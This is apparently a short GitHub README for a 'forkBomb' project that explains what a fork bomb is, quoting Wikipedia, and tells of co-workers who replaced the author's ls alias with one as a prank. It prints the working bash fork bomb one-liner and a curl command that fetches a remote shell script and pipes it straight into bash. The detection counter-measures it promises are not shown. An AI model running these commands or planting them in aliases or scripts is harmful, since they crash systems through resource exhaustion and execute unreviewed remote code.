# forkBomb
Fork Bomb on the Linux Machine

## What is this for?
This is to enable Fork Bomb on a linux Machine. It also contains simple counter-measures to detect the fork bomb command.

## What was the motivation for this project?
During an internship program, two of my co-workers attempted to play a prank on me by replacing my alias of `ls` and `ll` with a fork bomb command.

## What is the Fork Bomb?
As obtained from the definition from Wikipedia:
>In computing, a fork bomb (also called rabbit virus or wabbit[1]) is a denial-of-service attack wherein a process continually replicates itself to deplete available system resources, slowing down or crashing the system due to resource starvation.

*Link to [Fork Bomb Wikipedia](https://en.wikipedia.org/wiki/Fork_bomb) page*

## What is the command to execute the Fork Bomb?
Here is the command as follows:
```
:(){ :|: &};:
```

## A dangerous way of running this command
```
$ curl "https://cdn.rawgit.com/nabilfadjar/forkBomb/master/forkBomb.sh" | bash
```
